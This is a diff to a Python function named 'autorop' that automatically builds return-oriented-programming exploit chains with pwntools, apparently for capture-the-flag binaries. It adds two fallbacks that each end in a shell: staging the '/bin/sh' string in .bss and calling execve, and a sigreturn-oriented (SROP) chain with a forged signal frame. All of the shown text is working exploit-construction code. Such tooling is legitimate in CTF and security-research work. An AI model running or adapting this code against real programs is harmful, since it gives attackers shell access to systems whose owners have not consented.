@@ -415,12 +415,44 @@ def autorop(binary: str, offset=None, run: bool = True) -> dict:
                     built = True; strategy = "execve syscall (gadgets)"
             except Exception:
                 pass
-        # 3) last resort: let pwntools pick (may use sigreturn)
-        if not built:
-            try:
-                rop.execve(binsh, 0, 0); built = True; strategy = "execve (pwntools auto)"
-            except Exception:
-                pass
+    # 3) Let pwntools build execve('/bin/sh'), STAGING the string into writable memory when the
+    #    binary has no "/bin/sh" literal (common in static binaries where the linker dropped it,
+    #    e.g. staticrop). Passing the literal bytes makes pwntools write them to .bss/.data with
+    #    the available gadgets and point the syscall at them -- so we don't depend on an existing
+    #    string. A fresh ROP() per attempt so a half-built chain from above isn't reused.
+    if not built:
+        target = binsh if binsh is not None else b"/bin/sh\x00"
+        try:
+            rop = ROP(elf)
+            rop.execve(target, 0, 0)
+            rop.chain()                             # force resolution now (raises if unsatisfiable)
+            built = True
+            strategy = ("execve (pwntools auto)" if binsh is not None
+                        else "execve (pwntools, '/bin/sh' staged a .bss)")
+        except Exception:
+            built = False
+    # 4) explicit SROP fallback: a fake sigcontext (rt_sigreturn, RAX=15) sets ALL registers at
+    #    once, so it needs only `pop rax; ret` + a syscall gadget -- no pop rdi/rsi/rdx. Used when
+    #    the execve chain can't satisfy the arg registers. Needs an in-memory "/bin/sh" (binsh).
+    if not built and binsh is not None:
+        try:
+            from pwn import SigreturnFrame
+            rop = ROP(elf)
+            pop_rax = rop.find_gadget(["pop rax", "ret"])
+            sc = rop.find_gadget(["syscall", "ret"]) or rop.find_gadget(["syscall"])
+            if pop_rax and sc:
+                frame = SigreturnFrame()
+                frame.rax = 0x3b                 # execve
+                frame.rdi = binsh
+                frame.rsi = 0
+                frame.rdx = 0
+                frame.rip = sc.address           # the frame's RIP runs execve('/bin/sh', 0, 0)
+                rop.raw(pop_rax.address); rop.raw(15)   # RAX = 15 (rt_sigreturn)
+                rop.raw(sc.address)                     # syscall -> rt_sigreturn consumes the frame
+                rop.raw(bytes(frame))
+                built = True; strategy = "SROP (sigreturn execve)"
+        except Exception:
+            pass
     if not built:
         return {"ok": False, "note": "no se pudo construir cadena automatica (sin /bin/sh o "
                 "gadgets suficientes; ret2libc dinamico necesita libc/leak)"}
